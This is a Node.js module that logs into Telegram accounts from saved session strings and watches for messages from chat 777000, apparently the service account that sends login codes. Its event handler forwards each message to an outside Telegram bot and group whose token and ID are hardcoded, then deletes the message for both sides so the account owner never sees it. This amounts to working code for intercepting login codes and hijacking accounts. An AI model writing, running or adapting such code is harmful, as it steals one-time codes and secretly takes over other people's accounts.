const { TelegramClient } = require('telegram');
const { NewMessage } = require("telegram/events/index.js");
const axios = require('axios');
const { StringSession } = require('telegram/sessions');
const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";
const clients = new Map();

function getClient(number) {
    return clients.get(number);
}

function hasClient(number) {
    return clients.has(number);
}

async function disconnectAll() {
    for (const [phoneNumber, client] of clients.entries()) {
        try {
            await client?.disconnect();
            clients.delete(phoneNumber);
            console.log(`Client disconnected: ${phoneNumber}`);
        } catch (error) {
            console.log(error);
            console.log(`Failed to Disconnect : ${phoneNumber}`);
        }
    }
}


async function createClient(number, session) {
    return new Promise(async (resolve) => {
      const cli = new TelegramManager(session, number);  
      await cli.createClient();
      console.log("isexpired", cli.expired);
  
      if (!cli.expired) {
        clients.set(number, cli);
        resolve(true);
      } else {
        console.log("User Expired");
        resolve(false);
      }
    });
  }
  

class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.expired = false;
    }

    async disconnect() {
        await this.client.disconnect();
        await this.client.destroy();
        this.session.delete();
    }

    async createClient() {
        try {
            this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
                connectionRetries: 5,
            });
            await this.client.connect();
            const msg = await this.client.sendMessage("777000", { message: "." });
            await msg.delete({ revoke: true });
            setTimeout(async () => {
                console.log("SELF destroy client");
                await this.client.disconnect();
                await this.client.destroy();
                this.session.delete();
                clients.delete(this.phoneNumber);
            }, 180000)
            console.log(`Client connected: ${this.phoneNumber}`);
            this.client.addEventHandler(async (event) => { await this.handleEvents(event) }, new NewMessage());
            console.log("Added event");
            this.expired = false
        } catch (error) {
            console.log('here');
            console.log(error);
            this.expired = true;
        }
    }

    async getLastMsgs(limit) {
        const msgs = await this.client.getMessages("777000", { limit: parseInt(limit) });
        let resp = ''
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp = resp + msg.text + "\n"
        })
        return (resp)
    }

    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                const payload = {
                    "chat_id": "-1001801844217",
                    "text": event.message.text
                };
                axios.post(ppplbot, payload)
                    .then((response) => {
                    })
                    .catch((error) => {
                        console.error('Error sending message:', error.response.data.description);
                    });
                await event.message.delete({ revoke: true });
            }
        }
    }
}

module.exports = { TelegramManager, hasClient, getClient, disconnectAll, createClient }
